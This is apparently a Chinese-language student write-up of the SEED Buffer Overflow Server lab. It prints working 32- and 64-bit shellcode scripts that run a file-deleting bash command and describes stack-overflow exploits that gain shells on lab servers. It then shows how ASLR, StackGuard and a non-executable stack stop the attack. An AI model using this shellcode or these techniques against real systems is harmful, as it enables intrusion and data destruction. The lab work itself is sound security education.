---
hide:
  #- navigation # 显示右
  #- toc #显示左
  - footer
  - feedback
comments: true
---  

# Buffer Overflow Server

## 任务 1：熟悉 Shellcode

首先，我们在机器中新建一个任意的文件 `/tmp/deletefile`，修改 Shellcode，使得它能够删除这个文件，shellcode_32.py 如下：

```python title="shellcode_32.py"
#!/usr/bin/python3
import sys

# You can use this shellcode to run any command you want
shellcode = (
   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # You can modify the following command string to run any command.
   # You can even run multiple commands. When you change the string,
   # make sure that the position of the * at the end doesn't change.
   # The code above will change the byte at this position to zero,
   # so the command string ends here.
   # You can delete/add spaces, if needed, to keep the position the same. 
   # The * in this line serves as the position marker         * 
   "/bin/rm /tmp/deletefile                                   *"
   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBB"   # Placeholder for argv[1] --> "-c"
   "CCCC"   # Placeholder for argv[2] --> the command string
   "DDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

content = bytearray(200)
content[0:] = shellcode

# Save the binary code to file
with open('codefile_32', 'wb') as f:
  f.write(content)
```

同理，shellcode_64.py 如下：

```python title="shellcode_64.py"
#!/usr/bin/python3
import sys

# You can use this shellcode to run any command you want
shellcode = (
   "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
   "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
   "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
   "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # You can modify the following command string to run any command.
   # You can even run multiple commands. When you change the string,
   # make sure that the position of the * at the end doesn't change.
   # The code above will change the byte at this position to zero,
   # so the command string ends here.
   # You can delete/add spaces, if needed, to keep the position the same. 
   # The * in this line serves as the position marker         * 
   "/bin/rm /tmp/deletefile                                   *"
   "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
   "CCCCCCCC"   # Placeholder for argv[2] --> the command string
   "DDDDDDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

content = bytearray(200)
content[0:] = shellcode

# Save the binary code to file
with open('codefile_64', 'wb') as f:
  f.write(content)
```

编译并运行结果如下：

![](../../../../../assets/Pasted%20image%2020250708174403.png)

可以看到，我们成功实现了删除 `/tmp/deletefile` 文件的功能
***
## 任务 2：第一关

首先利用命令 `echo hello | nc 10.9.0.5 9090` 来获取服务器的帧指针和缓冲区地址：

![](../../../../../assets/Pasted%20image%2020250708212251.png)

我们可以构建 Payload 如下：

![](../../../../../assets/Pasted%20image%2020250708212315.png)

其中 start 控制 shellcode 的位置，ret 覆盖成 NOP 的指令区域范围内即可，offset 即我们之前得到的 ebp 与 buffer 地址之差再加 4，运行并验证：

![](../../../../../assets/Pasted%20image%2020250708211924.png)

可以看到，我们成功获取到了 server 的 shell
***
## 任务 3：第二关

同样，我们还是通过 `echo hello | nc 10.9.0.6 9090` 来获取信息：

![](../../../../../assets/Pasted%20image%2020250708212704.png)

此时我们获得了 Buffer 地址，但是帧指针地址却没有了，而我们知道缓冲区大小范围在 `[100,200]` 之间，因此我们在 Buffer 最大的情况下选取一个合适的返回地址，并在这个范围内全部覆盖成这个地址，那么不管怎么样我们都会覆盖到栈上真实的返回地址位置，代码如下：

![](../../../../../assets/Pasted%20image%2020250709205726.png)

运行并验证：

![](../../../../../assets/Pasted%20image%2020250709205635.png)
***
## 任务 4：第三关

同理，我们先去获得 Buffer 地址和帧指针信息：

![](../../../../../assets/Pasted%20image%2020250710114723.png)

这一关的唯一难度在于，64 位的地址不可避免地会出现 0x00 字节，因此我们需要将 shellcode 挪到前面来（即存到 buffer 当中），将返回地址改为 buffer 的地址，这样即使出现 0x00 字节被截断了，栈上的 0x00 字节也会被我们复用，代码如下：

![](../../../../../assets/Pasted%20image%2020250710155636.png)

运行并验证：

![](../../../../../assets/Pasted%20image%2020250710155808.png)

可以看到，我们成功获取到了 server 的 shell
***
## 任务 5：第四关

同样，我们先去获得 Buffer 地址和帧指针信息：

![](../../../../../assets/Pasted%20image%2020250710155944.png)

对比起第三关，这一关的 buffer 大小只有 96 字节，shellcode 放不下，但是因为在 stack 源码当中采用 `strcpy(buffer, str)`，我们的 shellcode 被完整地保存在了 str 中！因此我们需要将返回地址改为 str 在栈上的地址即可，用 `gcc -DBUF_SIZE=80 -DSHOW_FP -z execstack -fno-stack-protector -o stack -g stack.c` 编译源码 stack.c 并用 gdb 调试：

![](../../../../../assets/Pasted%20image%2020250710162453.png)

得到 str 相对 buffer 的 offset 为 1168，那么可以编写 Payload：

![](../../../../../assets/Pasted%20image%2020250710163000.png)

运行并验证：

![](../../../../../assets/Pasted%20image%2020250710162929.png)
***
## 任务 6：防御机制（地址随机化)

重新启用地址空间布局随机化，向第一关和第三关服务器多次发送 hello 信息：

![](../../../../../assets/Pasted%20image%2020250710163256.png)

可以看到，每次发送消息，缓冲区地址和帧指针地址都不一样了，因此我们只能由此知道缓冲区的大小，无法直接获得缓冲区的地址，使得攻击更加困难

使用脚本我们反复进行攻击：

![](../../../../../assets/Pasted%20image%2020250711221536.png)

![](../../../../../assets/Pasted%20image%2020250711221546.png)

在 13 分钟时才成功攻击到
***
## 任务 7：其他防护措施

### 任务 7.a：启用 StackGuard 防护

利用命令行 `gcc -DBUF_SIZE=100 -DSHOW_FP -z execstack -o stack stack.c` 启用 StackGuard 防护重启编译，并输入 badfile：

![](../../../../../assets/Pasted%20image%2020250711223308.png)

StackGuard 防护检测到栈溢出和崩溃，所以终止程序，攻击并没有成功
***
### 任务 7.b：启用不可执行栈防护

重新编辑 shellcode 下的 Makefile，去掉 `-z execstack` 选项，重新编译并运行：

![](../../../../../assets/Pasted%20image%2020250711223745.png)

可以看到，发生了段错误。程序访问了不可执行的栈空间，导致发生了段错误。当栈被设置为不可执行时，任何试图在栈上执行的指令都会触发 `Segmentation fault` 错误